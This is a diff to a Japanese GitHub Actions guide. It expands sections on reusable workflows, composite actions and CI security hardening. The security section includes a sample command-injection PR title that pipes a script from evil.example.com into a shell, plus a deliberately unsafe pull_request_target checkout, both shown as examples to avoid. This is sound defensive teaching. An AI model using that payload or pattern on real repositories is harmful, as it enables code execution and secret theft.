@@ -1,5 +1,5 @@
 ---
-reviewed: 2026-05-04
+reviewed: 2026-05-05
 tags: [github, yaml]
 ---
 
@@ -188,7 +188,9 @@ concurrency:
   cancel-in-progress: true
 ```
 
-## 再利用可能 workflow
+## 再利用可能 workflow（Reusable workflow）
+
+`workflow_call` をトリガーに持つ workflow を別 workflow から呼び出す。**job 単位の再利用**で、独立した job として実行される（呼び出し側の Job Summary に別 job として並ぶ）。
 
 ```yaml
 # .github/workflows/reusable-test.yaml
@@ -198,53 +200,101 @@ on:
       node-version:
         type: string
         default: "24"
+    outputs:
+      coverage:
+        description: "Coverage %"
+        value: ${{ jobs.test.outputs.coverage }}
+    secrets:
+      CODECOV_TOKEN:
+        required: false
 
 jobs:
   test:
     runs-on: ubuntu-latest
+    outputs:
+      coverage: ${{ steps.cov.outputs.percent }}
     steps:
       - uses: actions/checkout@v6
       - uses: actions/setup-node@v6
         with:
           node-version: ${{ inputs.node-version }}
       - run: pnpm run test
+      - id: cov
+        run: echo "percent=92" >> "$GITHUB_OUTPUT"
+```
 
-# 呼び出し側
+呼び出し側:
+
+```yaml
 jobs:
   test-20:
     uses: ./.github/workflows/reusable-test.yaml
     with:
       node-version: "20"
+    secrets: inherit            # 呼び出し元の全 secrets を引き継ぐ
   test-24:
     uses: ./.github/workflows/reusable-test.yaml
     with:
       node-version: "24"
+    secrets:
+      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}    # 個別指定
 ```
 
-組織共通の workflow は `org/.github` リポジトリに置いて `uses: org/.github/.github/workflows/foo.yaml@main` で参照できる。
+組織共通の workflow は `org/.github` リポジトリに置いて `uses: org/.github/.github/workflows/foo.yaml@v1` で参照できる。**他リポジトリ参照時はタグ / SHA を必ず付ける**（`@main` だと再現性が損なわれる）。
 
 ## Composite Action
 
-複数ステップを 1 action にまとめて再利用:
+複数ステップを 1 つの action にまとめて再利用する。**ステップ単位の再利用**で、呼び出し側 job の中に inline 展開される（独立した job ではない）。
 
 ```yaml
 # .github/actions/setup/action.yaml
 name: setup
+description: Install pnpm + Node + dependencies
+inputs:
+  node-version:
+    required: false
+    default: "24"
+outputs:
+  cache-hit:
+    value: ${{ steps.node.outputs.cache-hit }}
 runs:
   using: composite
   steps:
     - uses: pnpm/action-setup@v6
       with: { version: 10 }
-    - uses: actions/setup-node@v6
+    - id: node
+      uses: actions/setup-node@v6
       with:
-        node-version: 24
+        node-version: ${{ inputs.node-version }}
         cache: pnpm
     - run: pnpm install --frozen-lockfile
       shell: bash
-
-# 呼び出し
-- uses: ./.github/actions/setup
 ```
+
+呼び出し:
+
+```yaml
+- uses: ./.github/actions/setup
+  with:
+    node-version: "20"
+```
+
+注意点:
+
+- composite の `run:` は `shell:` 必須（reusable workflow は不要）
+- `secrets:` を直接受け取れない。呼び出し側で `env:` 経由で渡すか、`inputs:` に明示する
+- 同一リポジトリ参照は `./` 始まり、外部リポジトリ参照は `org/repo/path@ref`
+
+### 使い分け
+
+| 観点 | Reusable workflow | Composite action |
+|---|---|---|
+| 単位 | job | step |
+| 独立 job として表示 | される | されない |
+| matrix 展開 | 呼び出し側で可能 | 不可（呼び出し job の matrix に従う） |
+| `secrets:` 受け取り | できる（`secrets: inherit` 可） | できない（input/env で明示） |
+| `runs-on` 指定 | できる | 呼び出し側に従う |
+| 用途 | テスト・ビルド・デプロイ等の **job 全体**の再利用 | セットアップ手順等の **step 列**の再利用 |
 
 ## gh CLI との連携
 
@@ -258,12 +308,114 @@ gh は `GH_TOKEN` で認証可能。ローカル開発と同じコマンドが C
 
 ## セキュリティベストプラクティス
 
-1. **`permissions:` を明示**: デフォルト権限に頼らず最小権限
-2. **サードパーティ action は SHA 固定**: `uses: some/action@e83ad4c...`（タグは書き換え可能）
-3. **`pull_request_target` の取り扱い注意**: フォーク PR の内容が write 権限で動く危険イベント
-4. **secrets を echo しない**: ログに漏らさない
-5. **依存を Renovate / Dependabot で追随**: 脆弱な古い action を放置しない
-6. **`gitleaks` / `trivy` を CI に組み込む**: コミット前のシークレット・脆弱性チェック
+GitHub Actions のセキュリティは「**実行コードの信頼境界**」と「**シークレットの取り扱い**」の 2 軸で考える。
+
+### 1. `permissions:` を最小化する
+
+組織設定で `GITHUB_TOKEN` のデフォルト権限を `read` に絞り、必要な job のみ昇格する:
+
+```yaml
+# workflow 全体のデフォルトを read-only に
+permissions:
+  contents: read
+
+jobs:
+  release:
+    permissions:
+      contents: write     # この job だけタグ作成を許可
+      id-token: write     # OIDC を使う場合
+    steps: [...]
+```
+
+job レベルの `permissions:` は workflow レベルの宣言を**完全に置き換える**（マージではない）。job レベルで `contents: write` を書いたら、他のスコープは未付与扱いになる。
+
+### 2. サードパーティ action は SHA で pin する
+
+タグ（`@v4`）は書き換え可能。リポジトリが乗っ取られると過去の `v4` タグが悪意ある commit に張り替えられ、CI 経由で secrets が抜かれる。
+
+```yaml
+# NG: タグ参照
+- uses: some/action@v4
+
+# OK: 完全 SHA + 確認済みバージョンをコメント
+- uses: some/action@e83ad4c089b3186b7a5da8c9d9f8c6c43ceaef5e # v4.2.0
+```
+
+公式 (`actions/*`, `github/*`) はタグ運用でも実害は少ない。Renovate / Dependabot に SHA 更新を任せれば追随コストは下がる。
+
+### 3. Untrusted input によるスクリプトインジェクション
+
+`${{ github.event.pull_request.title }}` や `${{ github.head_ref }}` のように外部ユーザーが操作できる context を **shell スクリプトに直接展開しない**。フォーク PR のタイトルに `"; curl evil.example.com/x.sh | sh; #` を入れると、`run:` 内で実行される。
+
+```yaml
+# NG: シェルに直接展開
+- run: echo "Title: ${{ github.event.pull_request.title }}"
+
+# OK: env 経由で文字列として注入
+- env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "Title: $TITLE"
+```
+
+危険な context 例: `pull_request.title` / `pull_request.body` / `issue.title` / `issue.body` / `comment.body` / `head_ref` / `head.ref`。
+
+### 4. `pull_request_target` の取り扱い
+
+`pull_request_target` は **PR のフォーク先コードが、ベースリポジトリの secrets と write 権限で動く**特殊イベント。便利だが、フォーク PR を `actions/checkout` の `ref` で指定して checkout したら任意コード実行になる。
+
+```yaml
+# 危険: PR のコードを secrets 付きで実行してしまう
+on: pull_request_target
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}    # ← 危険
+      - run: pnpm test
+        env:
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+```
+
+原則:
+
+- フォーク PR にコメント・ラベル付けを行う等の **read-only な用途**に限定する
+- どうしても PR コードを実行したい場合は `pull_request` を使い、`Settings > Actions > Fork pull request workflows` の承認制を使う
+
+### 5. Secrets の取り扱い
+
+- **構造化シークレット禁止**: JSON / YAML 全体を 1 secret に格納すると、部分参照したフィールドが masking されない。フィールドごとに secret を分ける
+- **派生 secret は `::add-mask::`**: secret から導出した値（JWT、署名トークン等）を後続ステップで使う場合、`echo "::add-mask::$DERIVED"` で明示的に masking する
+- **CLI 引数で渡さない**: 同一ランナー上の他 job から `ps` で見えうる。env で渡す
+- **fork PR で secrets は渡らない**: `pull_request` イベントではフォークからの PR に secrets が露出しないが、`pull_request_target` では露出する
+
+### 6. OIDC でクラウド認証する
+
+長期 secret（`AWS_SECRET_ACCESS_KEY` 等）を保存せず、OIDC で短命トークンを取得する:
+
+```yaml
+permissions:
+  id-token: write       # OIDC token 発行に必須
+  contents: read
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v5
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeployRole
+          aws-region: ap-northeast-1
+      - run: aws s3 sync ./dist s3://my-bucket/
+```
+
+クラウド側の trust policy で `sub` claim（`repo:org/repo:ref:refs/heads/main` 等）を厳格に絞る。`repo:org/*` のようなワイルドカードは避ける。npm の Trusted Publishers も同じ仕組み（[`standards/npm-trusted-publishers.md`](../../standards/npm-trusted-publishers.md)）。
+
+### 7. その他
+
+- **依存追随**: Renovate / Dependabot で action のバージョンを追随する（[`tools/renovate.md`](../../tools/renovate.md), [`platforms/github/dependabot.md`](dependabot.md)）
+- **シークレットスキャン**: `gitleaks` / `trivy` を CI に組み込む（[`tools/gitleaks.md`](../../tools/gitleaks.md), [`tools/trivy.md`](../../tools/trivy.md)）
+- **Self-hosted runner はリポジトリスコープのみ**: public リポジトリで self-hosted を有効にすると任意コード実行リスクがある
 
 ## よく使う context 変数
 
